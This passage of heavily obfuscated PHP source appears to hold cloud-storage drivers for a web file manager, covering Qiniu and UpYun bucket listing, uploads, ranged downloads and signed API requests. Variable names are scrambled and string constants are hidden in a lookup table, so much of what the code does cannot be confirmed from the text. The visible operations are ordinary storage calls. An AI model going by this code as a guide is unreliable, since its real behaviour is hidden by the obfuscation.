(!empty($‹•ΥΏγ[$¶η¥ΙΏ[1551]])) { return !0; } } else { if (!empty($‹•ΥΏγ[$¶η¥ΙΏ[1552]])) { return !0; } } if ($¥άΙ»σ === $¶η¥ΙΏ[12]) { break; } } if ($ΨΨΪβχΙ) { return array($¶η¥ΙΏ[242] => $¬Ξ†τηΌ, $¶η¥ΙΏ[243] => $ήΉ ΣΨ); } return !1; } public function listAll($¨ΈΣϋέΈ) { $ΎΞΓπ =& $_SERVER[γγάψ½]; $τ§ΣφΣ¬ = $this->fileList($¨ΈΣϋέΈ, $ΎΞΓπ[12], !0); $¥ΉΜΠΪό = array_to_keyvalue($τ§ΣφΣ¬[$ΎΞΓπ[86]], $ΎΞΓπ[32]); foreach ($τ§ΣφΣ¬[$ΎΞΓπ[85]] as $¬®Έ¨λ) { if (is_string($¬®Έ¨λ)) { $¥ΉΜΠΪό[$¬®Έ¨λ] = array($ΎΞΓπ[79] => 0); } } return $this->listAllFiles($¨ΈΣϋέΈ, $¥ΉΜΠΪό); } private function fileList($Ιήα³ί, $•Χ¬ΑΥ = '', $†ήν–€ω = 0) { $Μ²Ωδ =& $_SERVER[γγάψ½]; $Ιήα³ί = trim($Ιήα³ί, $Μ²Ωδ[8]); $ΘτλϋΛ = empty($Ιήα³ί) && $Ιήα³ί !== $Μ²Ωδ[231] ? $Μ²Ωδ[12] : $Ιήα³ί . $Μ²Ωδ[8]; $ΨΓΊΛ³§ = $Μ²Ωδ[12]; $•κξ£Κ― = 1000; $Ε¦•‚Ύ = $„ρ½ώψώ = array(); while (!0) { check_abort(); list($ΒμόυΤ·, $φΗ‚†Ίω) = $this->bucketManager->listFiles($this->bucket, $ΘτλϋΛ, $ΨΓΊΛ³§, $•κξ£Κ―, $•Χ¬ΑΥ); if ($φΗ‚†Ίω) { break; } $ΨΓΊΛ³§ = array_key_exists($Μ²Ωδ[1495], $ΒμόυΤ·) ? $ΨΓΊΛ³§ = $ΒμόυΤ·[$Μ²Ωδ[1550]] : $Μ²Ωδ[12]; $“έ½¥εΠ = isset($ΒμόυΤ·[$Μ²Ωδ[1551]]) ? $ΒμόυΤ·[$Μ²Ωδ[1551]] : array(); $θΎΣθά— = isset($ΒμόυΤ·[$Μ²Ωδ[1552]]) ? $ΒμόυΤ·[$Μ²Ωδ[1552]] : array(); foreach ($“έ½¥εΠ as $«σΩƒ™Ζ) { if ($«σΩƒ™Ζ[$Μ²Ωδ[97]] == $ΘτλϋΛ) { continue; } $ °Χ = $«σΩƒ™Ζ[$Μ²Ωδ[97]]; $®‰λƒάΩ = $«σΩƒ™Ζ[$Μ²Ωδ[1548]]; $«σΩƒ™Ζ[$Μ²Ωδ[32]] = $ °Χ; $«σΩƒ™Ζ[$Μ²Ωδ[79]] = $®‰λƒάΩ; $ϊΠ¬«ώς = $®‰λƒάΩ == 0 && substr($ °Χ, strlen($ °Χ) - 1, 1) == $Μ²Ωδ[8] ? !0 : !1; $this->cacheMethodInfoSet($ °Χ, $ϊΠ¬«ώς, $«σΩƒ™Ζ); if ($ϊΠ¬«ώς) { $Ε¦•‚Ύ[] = $ °Χ; continue; } $„ρ½ώψώ[] = $†ήν–€ω ? $«σΩƒ™Ζ : $ °Χ; } foreach ($θΎΣθά— as $ °Χ) { if ($ °Χ == $ΘτλϋΛ) { continue; } $Ε¦•‚Ύ[] = $ °Χ; $this->cacheMethodInfoSet($ °Χ, !0); } if ($ΨΓΊΛ³§ === $Μ²Ωδ[12]) { break; } } $this->cacheMethodInfoSet($Ιήα³ί, !0); return array($Μ²Ωδ[85] => $Ε¦•‚Ύ, $Μ²Ωδ[86] => $„ρ½ώψώ); } public function canRead($άϋΠ·ώΗ) { return $this->exist($άϋΠ·ώΗ) ? !0 : !1; } public function canWrite($ν³νψ“) { return $this->exist($ν³νψ“) ? !0 : !1; } public function getContent($Χ•χ†Δ) { return $this->fileSubstr($Χ•χ†Δ, 0, -1); } public function setContent($σΧΤπόΔ, $Ε¥ΐ΄Ό = '') { $¨†ζ¶™­ = $this->tempFile($this->pathThis($σΧΤπόΔ)); file_put_contents($¨†ζ¶™­, $Ε¥ΐ΄Ό); if ($this->upload($σΧΤπόΔ, $¨†ζ¶™­)) { $this->tempFileRemve($¨†ζ¶™­); return !0; } return !1; } public function refreshUrls($Ουγ¥Ό) { $¥„”Ο―κ =& $_SERVER[γγάψ½]; $±εƒΗ¶ = array(); if (is_array($Ουγ¥Ό)) { foreach ($Ουγ¥Ό as $±Ί•) { $±εƒΗ¶[] = $this->link($±Ί•); } } else { $±εƒΗ¶[] = $this->link($Ουγ¥Ό); } $”ΏβΆθ = new Qiniu\Cdn\CdnManager($this->auth); list($©ΒνΰΕ, $η–σΰε°) = $”ΏβΆθ->refreshUrls($±εƒΗ¶); if ($η–σΰε°) { return !1; } return $©ΒνΰΕ[$¥„”Ο―κ[1275]] == $¥„”Ο―κ[834] ? !0 : !1; } public function fileSubstr($Έ­ΣΖ, $ο¨¥χ•, $¬΅²μ) { $ς’¤ϋ…Η =& $_SERVER[γγάψ½]; if (!($ΦόΉ = $this->link($Έ­ΣΖ))) { return !1; } $ΓΌόθ·‚ = !1; if ($¬΅²μ > 0) { $Έ§‰ω = $ο¨¥χ• + $¬΅²μ - 1; $ΓΌόθ·‚ = array($ς’¤ϋ…Η[1553] . $ο¨¥χ• . $ς’¤ϋ…Η[465] . $Έ§‰ω); } $ΘίΗά = url_request($ΦόΉ, $ς’¤ϋ…Η[1514], !1, $ΓΌόθ·‚); return $ΘίΗά[$ς’¤ϋ…Η[825]] ? $ΘίΗά[$ς’¤ϋ…Η[1298]] : !1; } public function upload($–ΚΞι¬, $‡–αΙ, $Χίκγ‡ = false, $©Ψ®‹ = REPEAT_REPLACE) { $‚½†”ν = new Qiniu\Storage\UploadManager(); $ΧΡα­¦ƒ = $this->auth->uploadToken($this->bucket, $–ΚΞι¬); $ƒηαά = get_file_mime(get_path_ext($‡–αΙ)); list($®ΣδΥκ, $«ΤΥ¨Ρ) = $‚½†”ν->putFile($ΧΡα­¦ƒ, $–ΚΞι¬, $‡–αΙ, null, $ƒηαά); return $«ΤΥ¨Ρ ? !1 : $this->getPathOuter($–ΚΞι¬); } public function uploadFormData($Π Β›Ε, $ϋύτΪ = 3600) { return $this->uploadToken($Π Β›Ε, $ϋύτΪ); } public function uploadMultiData($υΞχ“, $––Υνγ = 3600) { return $this->uploadToken($υΞχ“, $––Υνγ); } private function uploadToken($σ‹…φκ, $χΪή΅΄έ = 3600) { $ό―ιΧΎ =& $_SERVER[γγάψ½]; $„ΤΆι = $χΪή΅΄έ; $‰Τ‹Ύ³Ϋ = array($ό―ιΧΎ[1554] => $ό―ιΧΎ[1555]); $Η™™– = $σ‹…φκ; $οµ€ = $this->auth->uploadToken($this->bucket, $Η™™–, $„ΤΆι, $‰Τ‹Ύ³Ϋ, !0); $µ·—½φ = empty($this->region) || $this->region == $ό―ιΧΎ[1556] ? $ό―ιΧΎ[12] : $ό―ιΧΎ[465] . $this->region; $Ρ΄Ώ―Π† = http_type() . "\72\x2f\57\x75\x70\154\x6f\141\x64{$µ·—½φ}\x2e\161\x69\156\x69\165\x70\x2e\x63\157\x6d\x2f"; return array($ό―ιΧΎ[1557] => $οµ€, $ό―ιΧΎ[1558] => $Ρ΄Ώ―Π†); } public function download($Ω’§θ, $Τ¨βΌ”) { $©©™ϋΘ‡ = IO::getPathInner(IO::mkfile($Τ¨βΌ”)); if (!($ΦύΆ±ΙΌ = $this->link($Ω’§θ))) { return !1; } $δ¬θ‚Ψ = 0; $ƒΕƒχ¨ = 1024 * 200; $έΏΩ–γ = fopen($©©™ϋΘ‡, $_SERVER[γγάψ½][1559]); while (!0) { $οο„γσ = $this->fileSubstr($Ω’§θ, $δ¬θ‚Ψ, $ƒΕƒχ¨); if ($οο„γσ === !1) { return !1; } fwrite($έΏΩ–γ, $οο„γσ); $δ¬θ‚Ψ += $ƒΕƒχ¨; if (strlen($οο„γσ) < $ƒΕƒχ¨) { break; } } fclose($έΏΩ–γ); return $Τ¨βΌ”; } public function link($©„χ, $υΪΌΩΦ = '') { if (!$this->isFile($©„χ)) { return !1; } $—ξ―μ† = $this->getHost() . $_SERVER[γγάψ½][8] . $this->pathEncode($©„χ) . $υΪΌΩΦ; return $this->auth->privateDownloadUrl($—ξ―μ†, 3600 * 12); } public function fileOut($°®οΕο, $Ν = false, $¬·Ώ”½ = false, $«βΧΙ“υ = '') { $Ντφυ€ =& $_SERVER[γγάψ½]; if ($this->isFileOutServer()) { return $this->fileOutServer($°®οΕο, $Ν, $¬·Ώ”½, $«βΧΙ“υ); } if (!$¬·Ώ”½) { $¬·Ώ”½ = $this->pathThis($°®οΕο); } $α£ιό‚¬ = $Ν ? $Ντφυ€[1560] . rawurlencode($¬·Ώ”½) : $Ντφυ€[12]; $τπέΞψΥ = $this->link($°®οΕο, $α£ιό‚¬); $this->fileOutLink($τπέΞψΥ); } public function fileOutServer($Α³χ¦®χ, $ΰόƒΈα‚ = false, $Δ©ώσΊψ = false, $ψΘΓγ‘‡ = '') { parent::fileOut($Α³χ¦®χ, $ΰόƒΈα‚, $Δ©ώσΊψ, $ψΘΓγ‘‡); } public function fileOutImage($»­…άλΠ, $€ψλΔάΏ = 250) { if ($this->size($»­…άλΠ) > 1024 * 1024 * 20) { return $this->fileOutImageServer($»­…άλΠ, $€ψλΔάΏ); } $¨Ό³±½¬ = $this->link($»­…άλΠ, $_SERVER[γγάψ½][1561] . $€ψλΔάΏ); $this->fileOutLink($¨Ό³±½¬); } public function fileOutImageServer($ιΰ΄‚‡Ά, $΅†Ρΰέ£ = 250) { parent::fileOutImage($ιΰ΄‚‡Ά, $΅†Ρΰέ£); } public function hashMd5($€©Ζ„ΦΕ) { $ ΦώέβΚ =& $_SERVER[γγάψ½]; $¨ΫπΝα£ = $this->objectMeta($€©Ζ„ΦΕ); return isset($¨ΫπΝα£[$ ΦώέβΚ[248]]) ? $¨ΫπΝα£[$ ΦώέβΚ[248]] : !1; $ίοω΅δ = $this->link($€©Ζ„ΦΕ, $ ΦώέβΚ[1562]); } public function size($ΉϋΜιΎσ) { $ΏήΝφΎ = $this->objectMeta($ΉϋΜιΎσ); return $ΏήΝφΎ ? $ΏήΝφΎ[$_SERVER[γγάψ½][79]] : 0; } public function info($–ωυΰυη) { if ($this->isFolder($–ωυΰυη)) { return $this->folderInfo($–ωυΰυη); } else { if ($this->isFile($–ωυΰυη)) { return $this->fileInfo($–ωυΰυη); } } return !1; } public function exist($ρν‡¤ΡΔ) { return $this->isFile($ρν‡¤ΡΔ) || $this->isFolder($ρν‡¤ΡΔ); } public function isFile($ύΓ‚¤Ε) { return !$this->isFolder($ύΓ‚¤Ε) && $this->objectMeta($ύΓ‚¤Ε); } public function isFolder($Ω²ν»γΣ) { return $this->cacheMethod($_SERVER[γγάψ½][180], $Ω²ν»γΣ); } protected function objectMeta($–§κΟζ) { return $this->cacheMethod($_SERVER[γγάψ½][182], $–§κΟζ); } protected function _objectMeta($Θ„»Ίχ) { $ΰό°όΈ =& $_SERVER[γγάψ½]; list($ίΥΑΏΞΓ, $Έκω„β) = $this->bucketManager->stat($this->bucket, $Θ„»Ίχ); if ($ίΥΑΏΞΓ) { $ίΥΑΏΞΓ[$ΰό°όΈ[79]] = intval($ίΥΑΏΞΓ[$ΰό°όΈ[1548]]); } return $ίΥΑΏΞΓ; } protected function _isFolder($¶ήΦ΄χ€) { $‹Ή™Ψρ =& $_SERVER[γγάψ½]; if ($¶ήΦ΄χ€ == $‹Ή™Ψρ[12] || $¶ήΦ΄χ€ == $‹Ή™Ψρ[8]) { return !0; } list($—„®­Ρ—, $‘Ωί»’) = $this->bucketManager->listFiles($this->bucket, trim($¶ήΦ΄χ€, $‹Ή™Ψρ[8]) . $‹Ή™Ψρ[8], $‹Ή™Ψρ[12], 1, $‹Ή™Ψρ[8]); return !empty($—„®­Ρ—[$‹Ή™Ψρ[1551]]) || !empty($—„®­Ρ—[$‹Ή™Ψρ[1552]]) ? !0 : !1; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($‰¨”¬ί, $Θμκ…μύ = 0) { parent::__construct(); $this->source = $‰¨”¬ί; $this->sourceSize = $Θμκ…μύ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($Μ΄χ°έ = false) { return $this->sourceSize; } public function getContent($ΩΪΩΔσΈ = false) { return $this->fileSubstr($ΩΪΩΔσΈ, 0, $this->sourceSize); } public function fileSubstr($ƒΤ­§λ = false, $­εΊΛƒ‘ = 0, $³Ύ³ΩΥ = 0) { if (!$³Ύ³ΩΥ) { $³Ύ³ΩΥ = $this->sourceSize; } $­πΈ®φΜ = $this->sourceSize - $­εΊΛƒ‘; if ($³Ύ³ΩΥ >= $­πΈ®φΜ) { $³Ύ³ΩΥ = $­πΈ®φΜ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $­εΊΛƒ‘, $³Ύ³ΩΥ); } if ($this->sourceType == self::TYPE_FILE) { if ($³Ύ³ΩΥ <= 0) { return $_SERVER[γγάψ½][12]; } $Ψα§φδ¶ = ftell($this->source); fseek_64($this->source, $Ψα§φδ¶ + $­εΊΛƒ‘); $†Δ‰‹Ύψ = @fread($this->source, $³Ύ³ΩΥ); fseek_64($this->source, $Ψα§φδ¶); return $†Δ‰‹Ύψ; } } public function hashMd5($£„ός = false) { return md5($this->getContent()); } public static function hash($εΡλφ», $δΞ³²­Δ = 0) { $›ά‰΄Η = new PathDriverStream($εΡλφ», $δΞ³²­Δ); return $›ά‰΄Η->hashSimple($εΡλφ»); } public static function md5($«ΪΎζ©, $υ©Κχ΄ = 0) { $κΠ€©ΨΛ = new PathDriverStream($«ΪΎζ©, $υ©Κχ΄); return $κΠ€©ΨΛ->hashMd5($«ΪΎζ©); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\164\x70\72\57\57\x76\60\56\x61\x70\x69\56\165\160\171\165\156\56\143\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($ΚΆΕα›”) { parent::__construct(); $this->_init($ΚΆΕα›”); } public function _init($Ψ¥πέΔ) { $ςΝ©αΌ =& $_SERVER[γγάψ½]; foreach ($Ψ¥πέΔ as $ξλΓί => $„έ•”ΫΚ) { if (isset($this->{$ξλΓί})) { $this->{$ξλΓί} = $„έ•”ΫΚ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($ςΝ©αΌ[1563] . LNG($ςΝ©αΌ[1483])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($ †σΌΫµ, $…ΊΓ = "\107\105\x54") { $°­ϋψΐ§ =& $_SERVER[γγάψ½]; $ώΨίƒ = gmdate($°­ϋψΐ§[1512]); $“ςνΜφ = base64_encode(hash_hmac($°­ϋψΐ§[1564], "{$…ΊΓ}\x26{$ †σΌΫµ}\46{$ώΨίƒ}", md5("{$this->userpass}"), !0)); $π†·ΣΨΜ = array("\x41\165\x74\x68\x6f\x72\151\172\141\x74\151\x6f\x6e\72\x55\120\131\125\x4e\40{$this->username}\x3a{$“ςνΜφ}", "\x44\141\164\x65\72{$ώΨίƒ}"); return $π†·ΣΨΜ; } public function ussRequest($ώ©ζΕ΄, $ΊαΉγΏρ = "\107\x45\x54", $Ε°™Ην = false, $λέ‘ωι = false, $ϋρ°α– = false) { $ϊΫΩνΪφ =& $_SERVER[γγάψ½]; $ώ©ζΕ΄ = trim($ώ©ζΕ΄, $ϊΫΩνΪφ[8]); $­Β°¶©ύ = "\57{$this->bucket}\57" . rawurlencode($ώ©ζΕ΄); $ΉΙγ§ = $this->ussHeaders($­Β°¶©ύ, $ΊαΉγΏρ); if ($λέ‘ωι) { $ΉΙγ§ = array_merge($ΉΙγ§, $λέ‘ωι); } $Ή†υαΙΘ = url_request($this->endpoint . $­Β°¶©ύ, $ΊαΉγΏρ, $Ε°™Ην, $ΉΙγ§, $ϋρ°α–); if (!$Ή†υαΙΘ) { $κΑψΦϊ = LNG($ϊΫΩνΪφ[1565]); $this->writeLog($κΑψΦϊ); return array($ϊΫΩνΪφ[1308] => !1, $ϊΫΩνΪφ[1298] => $κΑψΦϊ); } if (strtolower($ΊαΉγΏρ) == $ϊΫΩνΪφ[230] || in_array($Ή†υαΙΘ[$ϊΫΩνΪφ[1308]], array($ϊΫΩνΪφ[264], $ϊΫΩνΪφ[1566]))) { $Ε°™Ην = $Ή†υαΙΘ[$ϊΫΩνΪφ[1567]]; if (!$Ή†υαΙΘ[$ϊΫΩνΪφ[825]]) { $Ε°™Ην = isset($Ε°™Ην[0]) ? $Ε°™Ην[0] : $ϊΫΩνΪφ[12]; } } else { $Ε°™Ην = json_decode($Ή†υαΙΘ[$ϊΫΩνΪφ[1298]], !0); if (!$Ε°™Ην) { $Ε°™Ην = $Ή†υαΙΘ[$ϊΫΩνΪφ[1298]]; } else { if (!$Ή†υαΙΘ[$ϊΫΩνΪφ[825]] && isset($Ε°™Ην[$ϊΫΩνΪφ[1568]])) { $Ε°™Ην = $Ε°™Ην[$ϊΫΩνΪφ[1568]]; } } } if (!$Ή†υαΙΘ[$ϊΫΩνΪφ[825]]) { $this->writeLog($this->__errorMessage($Ε°™Ην)); } return array($ϊΫΩνΪφ[1308] => $Ή†υαΙΘ[$ϊΫΩνΪφ[825]], $ϊΫΩνΪφ[1298] => $Ε°™Ην); } private function __errorMessage($΄Ϋ­ΖΏ) { $³ς¶°ητ =& $_SERVER[γγάψ½]; if (!$΄Ϋ­ΖΏ) { return $³ς¶°ητ[12]; } static $Ν΄£Ν±® = null; if (!$Ν΄£Ν±®) { $Ν΄£Ν±® = I18n::getType(); } if ($Ν΄£Ν±® != $³ς¶°ητ[1521]) { return $΄Ϋ­ΖΏ; } $Λ“σΥΖ = array($³ς¶°ητ[1569] => $³ς¶°ητ[1570], $³ς¶°ητ[1571] => $³ς¶°ητ[1572], $³ς¶°ητ[1573] => $³ς¶°ητ[1572], $³ς¶°ητ[1574] => $³ς¶°ητ[1575], $³ς¶°ητ[1576] => $³ς¶°ητ[1577], $³ς¶°ητ[1578] => $³ς¶°ητ[1579], $³ς¶°ητ[1580] => $³ς¶°ητ[1581]); return isset($Λ“σΥΖ[$΄Ϋ­ΖΏ]) ? $Λ“σΥΖ[$΄Ϋ­ΖΏ] : $΄Ϋ­ΖΏ; } public function mkfile($όΜσ“ΨΕ, $αϋύ­Τ– = '', $Ίƒ­Ω΄‡ = REPEAT_RENAME) { if ($this->setContent($όΜσ“ΨΕ, $αϋύ­Τ–)) { return $this->getPathOuter($όΜσ“ΨΕ); } return !1; } public function mkdir($‘–α­, $όή°Ε = REPEAT_SKIP) { $©’§Ζ =& $_SERVER[γγάψ½]; $ΒΩβΜΗ€ = trim($‘–α­, $©’§Ζ[8]); if ($this->_isFolder($ΒΩβΜΗ€)) { return $this->getPathOuter($ΒΩβΜΗ€); } $·Θ†οΪ• = array($©’§Ζ[1582]); $ώϋΞΣ = $this->ussRequest($ΒΩβΜΗ€, $©’§Ζ[291], !1, $·Θ†οΪ•); return $ώϋΞΣ[$©’§Ζ[1308]] ? $this->getPathOuter($ΒΩβΜΗ€) : !1; } public function copyFile($£ςΥψ, $ΡΩ‰µΧ) { $ψή£ί‹ =& $_SERVER[γγάψ½]; $΅ξƒΆ‘ε = array($ψή£ί‹[1583] . "\x2f{$this->bucket}\57{$£ςΥψ}", $ψή£ί‹[1584]); $ξ³Ήΰι = $this->ussRequest($ΡΩ‰µΧ, $ψή£ί‹[256], !1, $΅ξƒΆ‘ε); return $ξ³Ήΰι[$ψή£ί‹[1308]] ? !0 : $this->getPathOuter($ΡΩ‰µΧ); } public function moveFile($ξ€Ύω‚, $ƒΡΝΟ¦) { $ύηΝΰ =& $_SERVER[γγάψ½]; $ςχ“η› = array($ύηΝΰ[1585] . "\x2f{$this->bucket}\57{$ξ€Ύω‚}", $ύηΝΰ[1584]); $§Ψώ¦ = $this->ussRequest($ƒΡΝΟ¦, $ύηΝΰ[256], !1, $ςχ“η›); return $§Ψώ¦[$ύηΝΰ[1308]] ? !0 : $this->getPathOuter($ƒΡΝΟ¦); } public function delFile($Ε¨„Ϊέ) { $¥ΑξΦ™Τ =& $_SERVER[γγάψ½]; $»”ΐη‹Θ = $this->ussRequest($Ε¨„Ϊέ, $¥ΑξΦ™Τ[1586]); return $»”ΐη‹Θ[$¥ΑξΦ™Τ[1308]] ? !0 : !1; } public function delFolder($θΒµΑ©) { $¥Ι ¨ά± =& $_SERVER[γγάψ½]; if (!$this->exist($θΒµΑ©)) { return !0; } $this->listItemCache = !1; $΄ί·λγ = $ή®ώ¤½ = array(); $this->fileList($θΒµΑ©, $΄ί·λγ, $ή®ώ¤½, !0); $this->listItemCache = !0; foreach ($ή®ώ¤½ as $‡Ηυ¶‘) { $…—Δ“Ύα = $this->ussRequest($‡Ηυ¶‘[$¥Ι ¨ά±[32]], $¥Ι ¨ά±[1586]); if (!$…—Δ“Ύα[$¥Ι ¨ά±[1308]]) { return !1; } } usort($΄ί·λγ, function ($±ς©ΧΛ , $’Ϋοϊ) { $Υ­Βσ =& $_SERVER[γγάψ½]; return substr_count($’Ϋοϊ, $Υ­Βσ[8]) - substr_count($±ς©ΧΛ , $Υ­Βσ[8]); }); foreach ($΄ί·λγ as $’„ΈζΤ‹) { $…—Δ“Ύα = $this->ussRequest($’„ΈζΤ‹, $¥Ι ¨ά±[1586]); if (!$…—Δ“Ύα[$¥Ι ¨ά±[1308]]) { return !1; } } $…—Δ“Ύα = $this->ussRequest($θΒµΑ©, $¥Ι ¨ά±[1586]); return $…—Δ“Ύα[$¥Ι ¨ά±[1308]]; } public function rename($όψ‰Γ©›, $ΏΫϋδβ) { if ($this->isFile($όψ‰Γ©›)) { $ΏΫϋδβ = get_path_father($όψ‰Γ©›) . $ΏΫϋδβ; return $this->moveFile($όψ‰Γ©›, $ΏΫϋδβ); } return $this->renameObject($όψ‰Γ©›, $ΏΫϋδβ); } public function fileInfo($΄ζ½©›, $–”«ιΜ = false, $΅ε¦ύ = array()) { $’Τ‹ κ‡ =& $_SERVER[γγάψ½]; $«χ¤£…ώ = array($’Τ‹ κ‡[32] => $this->pathThis($΄ζ½©›), $’Τ‹ κ‡[87] => $this->getPathOuter($’Τ‹ κ‡[8] . $΄ζ½©›), $’Τ‹ κ‡[33] => $’Τ‹ κ‡[233], $’Τ‹ κ‡[79] => isset($΅ε¦ύ[$’Τ‹ κ‡[79]]) ? $΅ε¦ύ[$’Τ‹ κ‡[79]] : 0, $’Τ‹ κ‡[169] => $this->ext($΄ζ½©›)); if ($–”«ιΜ) { return $«χ¤£…ώ; } $«χ¤£…ώ[$’Τ‹ κ‡[234]] = $«χ¤£…ώ[$’Τ‹ κ‡[88]] = 0; $«χ¤£…ώ[$’Τ‹ κ‡[235]] = $«χ¤£…ώ[$’Τ‹ κ‡[236]] = !0; if (empty($΅ε¦ύ)) { $΅ε¦ύ = $this->objectMeta($΄ζ½©›); if (!$΅ε¦ύ) { return $«χ¤£…ώ; } } $«χ¤£…ώ[$’Τ‹ κ‡[234]] = intval($΅ε¦ύ[$’Τ‹ κ‡[1587]]); $«χ¤£…ώ[$’Τ‹ κ‡[88]] = intval($΅ε¦ύ[$’Τ‹ κ‡[1588]]); $«χ¤£…ώ[$’Τ‹ κ‡[79]] = $΅ε¦ύ[$’Τ‹ κ‡[79]]; return $«χ¤£…ώ; } public function folderInfo($ΡημΠ•, $—ξηω = false) { $ ©ΑΨ› =& $_SERVER[γγάψ½]; $­¬ξέ™β = array($ ©ΑΨ›[32] => $this->pathThis($ΡημΠ•), $ ©ΑΨ›[87] => $this->getPathOuter($ ©ΑΨ›[8] . $ΡημΠ•), $ ©ΑΨ›[33] => $ ©ΑΨ›[78]); if ($—ξηω) { return $­¬ξέ™β; } $­¬ξέ™β[$ ©ΑΨ›[234]] = $­¬ξέ™β[$ ©ΑΨ›[88]] = 0; $­¬ξέ™β[$ ©ΑΨ›[235]] = $­¬ξέ™β[$ ©ΑΨ›[236]] = !0; if (empty($δΓθδ†)) { $δΓθδ† = $this->objectMeta($ΡημΠ•); if (!$δΓθδ†) { return $­¬ξέ™β; } } $­¬ξέ™β[$ ©ΑΨ›[234]] = intval($δΓθδ†[$ ©ΑΨ›[1587]]); $­¬ξέ™β[$ ©ΑΨ›[88]] = intval($δΓθδ†[$ ©ΑΨ›[1588]]); return $­¬ξέ™β; } private function listObjs($Π…ϊ®αΑ, $λ°΅Πµζ = 0, $λΐξƒιΖ = 1000) { $†αΦτρΙ =& $_SERVER[γγάψ½]; $Π“ϋί΄Έ = array($†αΦτρΙ[1589], $†αΦτρΙ[1590] . $λΐξƒιΖ); if ($λ°΅Πµζ) { $Π“ϋί΄Έ[] = $†αΦτρΙ[1591] . $λ°΅Πµζ; } $΄ϊΝσ¤– = $this->ussRequest($Π…ϊ®αΑ, $†αΦτρΙ[1514], !1, $Π“ϋί΄Έ); return !$΄ϊΝσ¤–[$†αΦτρΙ[1308]] ? !1 : $΄ϊΝσ¤–[$†αΦτρΙ[1298]]; } private function fileList($°ΟϋΜΝΖ, &$όΧ‘ϋΤ«, &$ΥΚΏ‘Μ³, $ƒο¦άΥ = false) { $―‘ΨυΣ‘ =& $_SERVER[γγάψ½]; $β―Ή¶ = $―‘ΨυΣ‘[12]; $΅δΝ¥ = 1000; $Ε·Ε΄• = rtrim($°ΟϋΜΝΖ, $―‘ΨυΣ‘[8]) . $―‘ΨυΣ‘[8]; while (!0) { check_abort(); $οΛΚ’ = $this->listObjs($°ΟϋΜΝΖ, $β―Ή¶, $΅δΝ¥); if (!$οΛΚ’) { return !1; } $β―Ή¶ = isset($οΛΚ’[$―‘ΨυΣ‘[1592]]) ? $οΛΚ’[$―‘ΨυΣ‘[1592]] : $―‘ΨυΣ‘[12]; $δΣ°† ϋ = isset($οΛΚ’[$―‘ΨυΣ‘[1593]]) ? $οΛΚ’[$―‘ΨυΣ‘[1593]] : array(); foreach ($δΣ°† ϋ as $Ηκϊ“Λ) { $ο³κψ„ = $Ηκϊ“Λ[$―‘ΨυΣ‘[33]] == $―‘ΨυΣ‘[78] ? !0 : !1; $ϊρςΨπ = ltrim($Ε·Ε΄• . $Ηκϊ“Λ[$―‘ΨυΣ‘[32]], $―‘ΨυΣ‘[8]) . ($ο³κψ„ ? $―‘ΨυΣ‘[8] : $―‘ΨυΣ‘[12]); $’ΉΙΐ¨ = array($―‘ΨυΣ‘[32] => $ϊρςΨπ, $―‘ΨυΣ‘[33] => $ο³κψ„ ? $―‘ΨυΣ‘[78] : $―‘ΨυΣ‘[233], $―‘ΨυΣ‘[79] => $Ηκϊ“Λ[$―‘ΨυΣ‘[415]], $―‘ΨυΣ‘[1588] => $Ηκϊ“Λ[$―‘ΨυΣ‘[1594]]); $this->cacheMethodInfoSet($ϊρςΨπ, $ο³κψ„, $’ΉΙΐ¨); if ($ο³κψ„) { $όΧ‘ϋΤ«[] = $ϊρςΨπ; if ($ƒο¦άΥ) { $this->fileList($ϊρςΨπ, $όΧ‘ϋΤ«, $ΥΚΏ‘Μ³, $ƒο¦άΥ); } continue; } $ΥΚΏ‘Μ³[] = $’ΉΙΐ¨; } if (count($δΣ°† ϋ) < $΅δΝ¥) { break; } } $this->cacheMethodInfoSet($°ΟϋΜΝΖ, !0); } public function listPath($¦ΊΦ¨χ, $σ³θωϋ = false) { $°βΥιΦΒ =& $_SERVER[γγάψ½]; $Ύ·…ΐ = $ιβΆν = array(); $this->fileList($¦ΊΦ¨χ, $Ύ·…ΐ, $ιβΆν); foreach ($Ύ·…ΐ as $‹–΄Γ => $…ΡΪΕΨ¶) { $Ύ·…ΐ[$‹–΄Γ] = $this->folderInfo($…ΡΪΕΨ¶, $σ³θωϋ); } foreach ($ιβΆν as $‹–΄Γ => $…ΡΪΕΨ¶) { $ιβΆν[$‹–΄Γ] = $this->fileInfo($…ΡΪΕΨ¶[$°βΥιΦΒ[32]], $σ³θωϋ, $…ΡΪΕΨ¶); } return array($°βΥιΦΒ[85] => $Ύ·…ΐ, $°βΥιΦΒ[86] => $ιβΆν); } public function has($…Λφ®, $λΕδΔ„ = false, $δΓϋΩ…ΐ = true) { $Έόμ΄Τ =& $_SERVER[γγάψ½]; $τ„ΤΊ¦ = $Έόμ΄Τ[12]; $­’Ρί”φ = 500; $³„½΅¦ = 0; $·ΐ΅›Ώ = 0; $ΆΓ›ληΪ = rtrim($…Λφ®, $Έόμ΄Τ[8]) . $Έόμ΄Τ[8]; while (!0) { check_abort(); $›½Γ§ξ‚ = $this->listObjs($…Λφ®, $τ„ΤΊ¦, $­’Ρί”φ); if (!$›½Γ§ξ‚) { return !1; } $τ„ΤΊ¦ = isset($›½Γ§ξ‚[$Έόμ΄Τ[1592]]) ? $›½Γ§ξ‚[$Έόμ΄Τ[1592]] : $Έόμ΄Τ[12]; $‚ΌζΕΚ = isset($›½Γ§ξ‚[$Έόμ΄Τ[1593]]) ? $›½Γ§ξ‚[$Έόμ΄Τ[1593]] : array(); if (empty($‚ΌζΕΚ)) { break; } $­ϋ·Π»Ί = array_filter($‚ΌζΕΚ, function ($½Γ«Θ¶γ) { $Ω…½¶„Ψ =& $_SERVER[γγάψ½]; return $½Γ«Θ¶γ[$Ω…½¶„Ψ[33]] == $Ω…½¶„Ψ[78]; }); $ΌΩος = count($‚ΌζΕΚ); $­ϋ·Π»Ί = count($­ϋ·Π»Ί); $σζΤ—· = $ΌΩος - $­ϋ·Π»Ί; if 